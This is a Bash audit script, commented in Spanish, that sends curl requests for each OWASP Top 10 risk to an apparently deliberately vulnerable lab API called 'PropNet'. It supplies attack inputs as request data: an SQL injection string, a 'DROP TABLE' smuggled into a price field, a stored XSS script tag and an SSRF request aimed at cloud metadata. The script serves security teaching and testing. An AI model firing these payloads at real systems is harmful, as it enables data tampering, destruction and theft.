#!/bin/bash
# auditar.sh - Ejecuta pruebas de los 10 riesgos OWASP Top 10 contra PropNet API
# Uso: ./auditar.sh http://IP_SERVIDOR:3000 [carpeta_salida] [url_metadata_mock]
#
# Reutilizable en Fase 1 (API vulnerable) y Fase 2 (API segura).

set -u

BASE_URL="${1:-http://localhost:3000}"
OUT_DIR="${2:-auditoria/fase1}"
METADATA_URL="${3:-http://127.0.0.1:9999/latest/meta-data/}"

mkdir -p "$OUT_DIR"
RESUMEN="$OUT_DIR/resumen.txt"
echo "Auditoria PropNet API - $(date)" > "$RESUMEN"
echo "Base URL: $BASE_URL" >> "$RESUMEN"
echo "----------------------------------------" >> "$RESUMEN"

run_test() {
  local nombre="$1"
  local archivo="$2"
  shift 2
  echo ">> Ejecutando $nombre"
  {
    echo "=== $nombre ==="
    echo "Comando: curl $*"
    echo "--- Respuesta ---"
    curl -s -w "\nHTTP_STATUS:%{http_code}\n" "$@"
    echo ""
  } > "$OUT_DIR/$archivo"
  tail -n 3 "$OUT_DIR/$archivo" >> "$RESUMEN"
  echo "----------------------------------------" >> "$RESUMEN"
}

# A01: Control de acceso roto - modificar valor de arriendo ajeno sin autenticacion
run_test "A01 - Control de acceso roto" "A01_control_acceso.txt" \
  -X PUT "$BASE_URL/arriendos/1" -H "Content-Type: application/json" \
  -d '{"precio": 1}'

# A02: Token de contrato en texto plano
run_test "A02 - Criptografia debil (token en claro)" "A02_criptografia.txt" \
  -X POST "$BASE_URL/contratos" -H "Content-Type: application/json" \
  -d '{"propiedad_id":1,"arrendatario_id":2,"confidencial":"Renta $450.000"}'

# A03: Inyeccion SQL en el buscador
run_test "A03 - Inyeccion SQL" "A03_sql_injection.txt" \
  -G "$BASE_URL/propiedades/buscar" \
  --data-urlencode "comuna=' OR '1'='1" \
  --data-urlencode "precio_max=999999999"

# A04: Reserva duplicada en el mismo horario
run_test "A04 - Conflicto de reservas (reserva 1)" "A04_reserva_1.txt" \
  -X POST "$BASE_URL/visitas" -H "Content-Type: application/json" \
  -d '{"propiedad_id":1,"fecha":"2026-10-10","hora":"10:00","visitante":"Persona A"}'
run_test "A04 - Conflicto de reservas (reserva 2, mismo horario)" "A04_reserva_2.txt" \
  -X POST "$BASE_URL/visitas" -H "Content-Type: application/json" \
  -d '{"propiedad_id":1,"fecha":"2026-10-10","hora":"10:00","visitante":"Persona B"}'

# A05: Exposicion de stack trace (forzando un error con precio_max invalido)
run_test "A05 - Exposicion de errores (stack trace)" "A05_stack_trace.txt" \
  -G "$BASE_URL/propiedades/buscar" \
  --data-urlencode "comuna=X" \
  --data-urlencode "precio_max=NOT_A_NUMBER); DROP TABLE propiedades;--"

# A06: Dependencias vulnerables (se corre npm audit sobre el proyecto)
echo ">> Ejecutando A06 - Dependencias vulnerables (npm audit)"
{
  echo "=== A06 - Dependencias vulnerables ==="
  (cd src/vulnerable 2>/dev/null && npm audit) || echo "Ejecutar manualmente: cd src/vulnerable && npm audit"
} > "$OUT_DIR/A06_dependencias.txt"
cat "$OUT_DIR/A06_dependencias.txt" | head -n 10 >> "$RESUMEN"
echo "----------------------------------------" >> "$RESUMEN"

# A07: Autenticacion debil con PIN de 3 digitos
run_test "A07 - Login (solicitar PIN)" "A07_login_pin.txt" \
  -X POST "$BASE_URL/login" -H "Content-Type: application/json" \
  -d '{"email":"juan@propnet.cl"}'

# A08: XSS persistente en descripcion de propiedad
run_test "A08 - XSS persistente" "A08_xss.txt" \
  -X POST "$BASE_URL/propiedades" -H "Content-Type: application/json" \
  -d '{"propietario_id":1,"titulo":"Depto con XSS","descripcion":"<script>alert(1)</script>","comuna":"Providencia","precio":400000}'

# A09: Acceso a contrato confidencial sin registro
run_test "A09 - Acceso sin registro a contrato" "A09_logging.txt" \
  -X GET "$BASE_URL/contratos/1"

# A10: SSRF via descarga de imagenes desde URL externa (apunta al mock de metadatos)
run_test "A10 - SSRF a metadatos internos" "A10_ssrf.txt" \
  -X POST "$BASE_URL/imagenes/descargar" -H "Content-Type: application/json" \
  -d "{\"url\": \"$METADATA_URL\"}"

echo ""
echo "Auditoria completa. Resumen en: $RESUMEN"
echo "Evidencias individuales en: $OUT_DIR/"
